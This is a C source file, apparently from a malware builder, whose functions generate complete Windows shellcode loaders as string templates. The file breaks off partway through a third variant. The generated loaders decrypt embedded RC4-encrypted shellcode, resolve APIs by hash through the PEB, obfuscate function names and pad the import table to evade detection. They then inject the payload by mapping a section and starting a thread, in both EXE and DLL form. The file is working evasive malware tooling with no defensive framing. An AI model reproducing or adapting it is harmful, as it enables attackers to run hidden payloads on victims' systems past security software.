        pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_start_func,
        random_initialize_func,
        random_obf_func,
        random_findtarget_func,
        pOpenProcess_name,
        random_rc4guard_func, random_key_name, random_payload_name, random_key_name, random_payload_name,
        random_inject_func, random_payload_name,
        pNtClose_name,
        random_start_func
    );
}




//================================================================================================================================================================//
// _source _code with deley 
//================================================================================================================================================================//
VOID deley_source_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));


    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* fnUnmapViewOfSection)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "} \n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define NTDLL_djb2                  0x5251037A\n"
        "#define KERNEL32_djb2               0xA5E086A2\n"
        "#define NtCreateSection_djb2        0x468A2FDD\n"
        "#define NtMapViewOfSection_djb2     0xC0261277\n"
        "#define NtUnmapViewOfSection_djb2   0x129AF9DA\n"
        "#define NtWaitForSingleObject_djb2  0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2       0x61D8C71D\n"
        "#define NtDelayExecution_djb2       0x1236E2D7\n"
        "#define NtClose_djb2                0xF20D7F2A\n"
        "#define LoadLibraryA_djb2           0xA4E3F108\n"
        "#define GetProcAddress_djb2         0xB9D893EC\n"
        "#define NtDelayExecution_djb2       0x1236E2D7\n\n"
        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"
        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL mapping_injection() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(EncryptedPayload) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddressH(ntdll, NtCreateSection_djb2);\n"
        "    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddressH(ntdll, NtMapViewOfSection_djb2);\n"
        "    fnUnmapViewOfSection pUnmapViewOfSection = (fnUnmapViewOfSection)GetProcAddressH(ntdll, NtUnmapViewOfSection_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtCreateSection(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    pNtMapViewOfSection(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, EncryptedPayload, sizeof(EncryptedPayload));\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, address, sizeof(ProtectedKey), sizeof(EncryptedPayload));\n"
        "    pNtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    pNtWaitForSingleObject(thandle, FALSE, &timeout);\n"
        "    pNtClose(thandle);\n"
        "    pUnmapViewOfSection((HANDLE)-1, address);\n"
        "    pNtClose(shandle);\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll,NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    delayEx(0.5);\n"
        "    mapping_injection();\n"
        "    return 0;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID deley_source_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));


    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);


    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* fnUnmapViewOfSection)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define NTDLL_djb2                  0x5251037A\n"
        "#define KERNEL32_djb2               0xA5E086A2\n"
        "#define NtCreateSection_djb2        0x468A2FDD\n"
        "#define NtMapViewOfSection_djb2     0xC0261277\n"
        "#define NtUnmapViewOfSection_djb2   0x129AF9DA\n"
        "#define NtWaitForSingleObject_djb2  0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2       0x61D8C71D\n"
        "#define NtDelayExecution_djb2       0x1236E2D7\n"
        "#define NtClose_djb2                0xF20D7F2A\n"
        "#define LoadLibraryA_djb2           0xA4E3F108\n"
        "#define GetProcAddress_djb2         0xB9D893EC\n"
        "#define NtDelayExecution_djb2       0x1236E2D7\n\n"
        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"

        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"
        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress(pLoadLibraryA(pAdvapi32),pFunction032 );\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL mapping_injection() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(EncryptedPayload) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddressH(ntdll, NtCreateSection_djb2);\n"
        "    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddressH(ntdll, NtMapViewOfSection_djb2);\n"
        "    fnUnmapViewOfSection pUnmapViewOfSection = (fnUnmapViewOfSection)GetProcAddressH(ntdll, NtUnmapViewOfSection_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtCreateSection(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    pNtMapViewOfSection(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, EncryptedPayload, sizeof(EncryptedPayload));\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, address, sizeof(ProtectedKey), sizeof(EncryptedPayload));\n"
        "    pNtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    pNtWaitForSingleObject(thandle, FALSE, &timeout);\n"
        "    pNtClose(thandle);\n"
        "    pUnmapViewOfSection((HANDLE)-1, address);\n"
        "    pNtClose(shandle);\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll,NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID run() {\n"
        "    delayEx(0.5);\n"
        "    mapping_injection();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID deley_source_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
